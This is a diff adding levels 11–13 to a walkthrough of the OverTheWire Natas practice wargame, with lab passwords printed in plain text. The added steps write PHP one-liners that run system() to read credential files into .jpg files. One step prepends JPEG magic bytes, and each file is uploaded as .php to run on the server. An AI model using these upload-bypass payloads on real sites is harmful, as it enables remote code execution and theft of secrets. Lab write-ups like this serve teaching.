@@ -1,4 +1,5 @@
 # Natas
+###### tags: `security walkthrough`
 ## Level 0
 ```
 Username: natas0
@@ -265,4 +266,57 @@ ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
 * password
 ```
 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+## Level 11 - 12
+* http://natas12.natas.labs.overthewire.org
+* prepare exploit image
+```
+echo "<?php echo system(\"cat /etc/natas_webpass/natas13\"); ?>" > natas12.jpg
+```
+
+* upload file and change ext name jpt to php
+
+![](https://i.imgur.com/OqdWFoJ.png)
+
+* click url
+
+![](https://i.imgur.com/VmJyGZr.png)
+
+* get password
+
+![](https://i.imgur.com/apCQAyv.png)
+
+* password
+```
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+```
+## Level 12 - 13
+* http://natas13.natas.labs.overthewire.org
+* prepare exploit image
+```
+echo "<?php echo system(\"cat /etc/natas_webpass/natas14\"); ?>" > natas13.jpg
+```
+* make jpg file hex signature `FF D8 FF DB` 
+```
+hexeditor -b natas13.jpg  
+```
+* ctrl+A add four bytes and mdf to `FF D8 FF DB`
+
+![](https://i.imgur.com/KKVyIp2.png)
+
+* upload file and change ext name jpt to php
+
+![](https://i.imgur.com/eAyJvBy.png)
+
+* click url
+
+![](https://i.imgur.com/4w6mZHX.png)
+
+* get password
+
+![](https://i.imgur.com/bubIMdy.png)
+
+* password
+```
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 ```
